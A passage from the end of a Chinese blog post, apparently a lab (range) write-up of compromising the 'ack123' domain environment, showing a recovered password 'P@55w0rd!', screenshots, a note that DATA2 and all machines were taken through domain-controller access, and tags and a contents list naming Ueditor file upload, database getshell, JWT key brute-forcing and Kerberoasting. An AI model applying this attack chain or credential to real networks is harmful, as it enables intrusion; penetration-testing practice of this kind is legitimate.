+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P@55w0rd!</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/05/ack123/image-20240120184827003.png" alt="image-20240120184827003"></p>
+<p><img src="/2023/10/05/ack123/image-20240120184833039.png" alt="image-20240120184833039"></p>
+<h2 id="DATA2服务器"><a href="#DATA2服务器" class="headerlink" title="DATA2服务器"></a>DATA2服务器</h2><p>直接通过域控权限上线DATA2服务器：</p>
+<p><img src="/2023/10/05/ack123/image-20240120184840192.png" alt="image-20240120184840192"></p>
+<p><img src="/2023/10/05/ack123/image-20240120184846685.png" alt="image-20240120184846685"></p>
+<p>所有机器上线：</p>
+<p><img src="/2023/10/05/ack123/image-20240120184853039.png" alt="image-20240120184853039"></p>
+
+        </div>
+
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/Ueditor%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">#Ueditor任意文件上传</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93GetShell/">#数据库GetShell</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/JWTKey%E7%88%86%E7%A0%B4/">#JWTKey爆破</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Kerberoasting/">#Kerberoasting</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2023/09/25/cncat/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">外网打点到内网域靶场-cncat</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>
+              -
+            
+            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">forg12</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v6.6.6</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">靶场描述</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA%E6%8B%93%E6%89%91%E5%9B%BE"><span class="nav-number">1.1.</span> <span class="nav-text">靶场拓扑图</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HOSTS%E8%AE%BE%E7%BD%AE"><span class="nav-number">1.2.</span> <span class="nav-text">HOSTS设置</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB1%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">2.</span> <span class="nav-text">WEB1服务器</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.1.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="nav-number">2.1.2.</span> <span class="nav-text">目录遍历</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">2.3.</span> <span class="nav-text">权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DATA1%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">3.</span> <span class="nav-text">DATA1服务器</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB2%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">4.</span> <span class="nav-text">WEB2服务器</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="nav-number">4.1.</span> <span class="nav-text">信息收集</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E6%8E%A7"><span class="nav-number">5.</span> <span class="nav-text">域控</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2"><span class="nav-number">5.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kerberoastiong"><span class="nav-number">5.2.</span> <span class="nav-text">Kerberoastiong</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DATA2%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">5.3.</span> <span class="nav-text">DATA2服务器</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
